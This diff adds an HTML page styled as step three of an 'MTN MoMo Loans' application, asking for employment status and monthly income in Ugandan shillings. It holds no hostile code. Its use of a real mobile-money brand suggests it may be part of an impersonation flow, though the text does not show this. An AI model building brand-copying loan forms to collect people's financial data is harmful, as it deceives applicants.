@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Financial Details - MTN MoMo</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background-color: #f4f5f7; color: #333; min-height: 100vh; display: flex; flex-direction: column; font-family: system-ui, -apple-system, sans-serif; margin: 0; }
+        .top-header { background-color: #003366; color: #FFCC00; padding: 14px 20px; text-align: center; font-weight: 800; font-size: 1.1rem; }
+        .app-container { width: 100%; max-width: 550px; margin: 0 auto; background: #ffffff; padding: 24px 20px; flex-grow: 1; display: flex; flex-direction: column; justify-content: space-between; }
+        @media (min-width: 576px) {
+            body { background-color: #003366; padding: 20px 0; align-items: center; justify-content: center; }
+            .app-container { border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.25); flex-grow: 0; }
+            .top-header { display: none; }
+        }
+        .btn-momo { background-color: #003366; color: #FFCC00; font-weight: bold; font-size: 1.1rem; padding: 14px; border-radius: 12px; border: none; width: 100%; }
+        .form-control, .form-select { padding: 12px 15px; border-radius: 10px; font-size: 1rem; }
+    </style>
+</head>
+<body>
+    <div class="top-header d-sm-none">
+        <span style="background: #FFCC00; color: #003366; padding: 2px 8px; border-radius: 6px;">MM</span> MTN MoMo Loans
+    </div>
+
+    <div class="app-container">
+        <div>
+            <div class="d-flex justify-content-between align-items-center mb-3">
+                <span class="badge bg-warning text-dark px-3 py-2 fw-bold text-uppercase">Step 3 of 3</span>
+                <span class="text-muted small">Financials</span>
+            </div>
+
+            <h3 class="fw-bold text-dark mb-1">Financial Information</h3>
+            <p class="text-muted small mb-4">Final check to confirm your credit rating and limit.</p>
+
+            <form id="step3Form" action="/apply/step3" method="POST">
+                <div class="mb-3">
+                    <label class="form-label fw-semibold text-secondary small">Employment Status</label>
+                    <select class="form-select" name="employment" required>
+                        <option value="Employed">Employed (Full-Time)</option>
+                        <option value="Self-Employed" selected>Self-Employed / Business</option>
+                        <option value="Contractor">Contract / Civil Servant</option>
+                        <option value="Student">Student / Other</option>
+                    </select>
+                </div>
+
+                <div class="mb-4">
+                    <label class="form-label fw-semibold text-secondary small">Monthly Income (UGX)</label>
+                    <input type="number" class="form-control" name="income" placeholder="e.g. 1500000" required>
+                </div>
+            </form>
+        </div>
+
+        <button type="submit" form="step3Form" class="btn btn-momo shadow-sm mt-3">SUBMIT & EVALUATE ➔</button>
+    </div>
+</body>
+</html>
